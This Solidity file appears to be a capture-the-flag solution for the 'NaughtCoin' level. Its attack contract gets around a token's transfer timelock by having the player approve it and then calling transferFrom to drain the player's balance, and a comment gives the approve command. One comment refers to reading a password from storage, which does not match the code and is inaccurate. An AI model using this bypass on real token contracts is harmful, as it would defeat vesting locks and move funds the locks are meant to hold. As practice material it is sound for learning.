// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./interfaces/INaughtCoin.sol";

contract NaughtCoinAttack {
    INaughtCoin private immutable victimNaughtCoin;

    constructor(INaughtCoin victimNaughtCoin_) {
        victimNaughtCoin = victimNaughtCoin_;
    }

    /**
     * @dev To get password from storage, you can run this script in client side:
     * > await contract.approve(<NaughtCoinAttack_CONTRACT_ADDRESS>, await contract.balanceOf(player))
     */
    function attack() external {
        require(
            victimNaughtCoin.transferFrom(msg.sender, address(this), victimNaughtCoin.balanceOf(msg.sender)) &&
                0 == victimNaughtCoin.balanceOf(msg.sender),
            "NaughtCoin: Attack failed"
        );
    }
}
